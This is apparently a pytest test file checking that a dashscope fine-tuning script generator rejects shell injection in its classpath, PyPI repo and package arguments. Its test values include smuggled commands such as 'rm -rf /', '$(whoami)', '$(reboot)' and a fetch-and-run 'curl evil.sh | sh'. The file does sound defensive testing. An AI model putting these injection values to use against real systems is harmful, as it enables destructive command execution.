# -*- coding: utf-8 -*-
import subprocess

import pytest

from dashscope.applications.finetune.reinforcement import InputError
from dashscope.applications.finetune.reinforcement.common.utils import (
    generate_agentic_script,
)


def _generate(fc_pypi_lib="dashscope", **overrides):
    kwargs = {
        "fc_pypi_lib": fc_pypi_lib,
        "fc_pypi_repo": "https://pypi.org/simple",
        "requirements_path": "reqs.txt",
        "func_type": "reward",
        "classpath": "module.path.Processor",
    }
    kwargs.update(overrides)
    return generate_agentic_script(**kwargs)


def _package_arguments(script):
    assignment = next(
        line for line in script.splitlines() if line.startswith("SDK_PACKAGE=")
    )
    output = subprocess.check_output(
        [
            "bash",
            "-c",
            f"{assignment}\n"
            'read -r -a local_packages <<< "$SDK_PACKAGE"\n'
            'printf "<%s>\\n" "${local_packages[@]}"',
        ],
        text=True,
    )
    return output.splitlines()


@pytest.mark.parametrize(
    "value",
    [
        'mod.Class"; rm -rf / #',
        "mod.$(whoami)",
        "mod.`id`",
        "mod.Class\necho pwned",
        "mod.Class extra",
    ],
)
def test_classpath_shell_injection_is_rejected(value):
    with pytest.raises(InputError):
        _generate(classpath=value)


def test_pypi_repo_shell_injection_is_rejected():
    with pytest.raises(InputError):
        _generate(
            fc_pypi_repo='https://pypi.org/simple"; curl evil.sh | sh; "',
        )


@pytest.mark.parametrize(
    "value",
    [
        "dashscope$(reboot)",
        "./dashscope-2.0.3-py3-none-any.whl; rm -rf /",
        "./*.whl",
        "./x.whl`id`",
        "| curl evil.sh",
    ],
)
def test_sdk_package_shell_injection_is_rejected(value):
    with pytest.raises(InputError):
        _generate(fc_pypi_lib=value)


@pytest.mark.parametrize(
    ("packages", "expected"),
    [
        (
            "./dashscope-2.0.3-py3-none-any.whl",
            ["./dashscope-2.0.3-py3-none-any.whl"],
        ),
        (
            "/abs/torch-1.0.0+cpu.whl ../dist/dashscope.whl",
            ["/abs/torch-1.0.0+cpu.whl", "../dist/dashscope.whl"],
        ),
        ("dashscope[extra]==1.0", ["dashscope[extra]==1.0"]),
        ("dashscope==1.*", ["dashscope==1.*"]),
        (
            "dashscope[extra]==1.0 dashscope==1.*",
            ["dashscope[extra]==1.0", "dashscope==1.*"],
        ),
    ],
)
def test_package_tokens_reach_pip_without_quote_or_glob_changes(
    packages,
    expected,
):
    script = _generate(fc_pypi_lib=packages)
    assert _package_arguments(script) == [f"<{value}>" for value in expected]


def test_requirements_path_is_shell_quoted():
    script = _generate(requirements_path="my reqs'file.txt")
    assert "REQUIREMENTS_FILE='my reqs'\"'\"'file.txt'" in script
